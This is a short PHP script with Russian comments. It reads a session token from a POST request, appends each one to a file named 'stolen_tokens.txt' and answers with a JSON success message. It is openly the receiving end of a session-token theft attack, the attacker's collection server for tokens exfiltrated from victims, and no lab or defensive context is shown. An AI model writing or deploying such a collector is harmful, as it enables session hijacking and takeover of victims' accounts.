<?php
// Получаем session_token из POST-запроса
$token = $_POST['token'];

// Записываем его в файл
file_put_contents('stolen_tokens.txt', "Token: $token\n", FILE_APPEND);

// Отправляем ответ, что данные получены
echo json_encode(['status' => 'success']);
?>